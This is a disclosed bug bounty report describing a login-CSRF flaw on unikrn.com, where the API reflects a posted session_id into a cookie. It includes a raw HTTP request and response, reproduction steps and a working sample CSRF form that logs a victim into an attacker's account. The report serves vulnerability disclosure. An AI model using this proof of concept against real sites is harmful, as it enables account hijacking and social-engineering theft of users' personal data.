# CSRF log victim into the attacker account

## Report Details
- **Report ID**: 293016
- **URL**: https://hackerone.com/reports/293016
- **State**: Closed
- **Severity**: high
- **Submitted**: 2017-11-26T07:54:43.228Z
- **Disclosed**: 2018-04-10T02:20:45.193Z

## Reporter
- **Username**: tolo7010
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: unikrn

## Vulnerability Information
All the API endpoints (v1 & v2) reflect session_id to Set-Cookie response - which can lead victim to login attacker account, for example:

Request:
======
``` 
POST /apiv1/ HTTP/1.1
Host: unikrn.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://unikrn.com/games/lol/afreeca-freecs-v-griffin---best-of-3/31638
Content-Type: application/json
Application-Version: v3.9.1-1485-g57625f1
Content-Length: 49
Cookie: ...
Connection: close

{"session_id":"ue9cpp0t2mitjpm0s45epj78l3kpig6j"}
``` 

Response:
=======
``` 
HTTP/1.1 202 Accepted
Date: Sun, 26 Nov 2017 07:28:38 GMT
Content-Type: application/json
Content-Length: 148
Connection: close
Access-Control-Allow-Origin: *
Access-Control-Max-Age: 86400
Cache-Control: no-store, no-cache, must-revalidate
CI: M-production C-1 V-1.2.0
Content-Security-Policy: default-src 'none'; frame-ancestors 'none'
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Pragma: no-cache
Set-Cookie: CW=ue9cpp0t2mitjpm0s45epj78l3kpig6j; expires=Wed, 06-Dec-2017 07:28:37 GMT; Max-Age=864000; path=/; domain=unikrn.com; secure; HttpOnly
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
Vary: Origin
X-XSS-Protection: 1; mode=block
Server: cloudflare-nginx
CF-RAY: 3c3b21cc1fb03415-HKG

{"success": false, "error": true, "msg": "missing_parameter_apiv1", "msg_trans": "missing_parameter_apiv1", "code": 666, "flds": null, "data": null}
``` 

Steps to reproduce:
=============
``` 
1. The victim has logged out the site by himself or by (out of scope) logout-CSRF. 
2. Attacker log into his account and get his session id (CW=) to craft CSRF page.
3. Lead the victim to visit CSRF page.
``` 

Sample CSRF Page
============
``` 
<!doctype html>
<html>
<head>
</head> 
<body>
<form action="https://unikrn.com/apiv1/" method="POST">
<input type="hidden" name="session_id" id="session_id" value="cm8csktf7p485hmb7on32o5bm94nm71i"> <!-- attacker session_id -->
<input type="submit"">
</form>
</body>
</html>
``` 

Note this sample CSRF assumes the user has logged out from the site, and make sure you replace attacker session_id of your current logged in account to reproduce, then goto unikrn.com after visiting the CSRF-page. However a script can be created here to automated these tasks.

## Impact

Log any victim into the attacker account, the attacker can create a similar account profile as the victim - with some information missing, and then social-engineering (e.g. email) user to provide personal information or current password.

## Attachments
No attachments
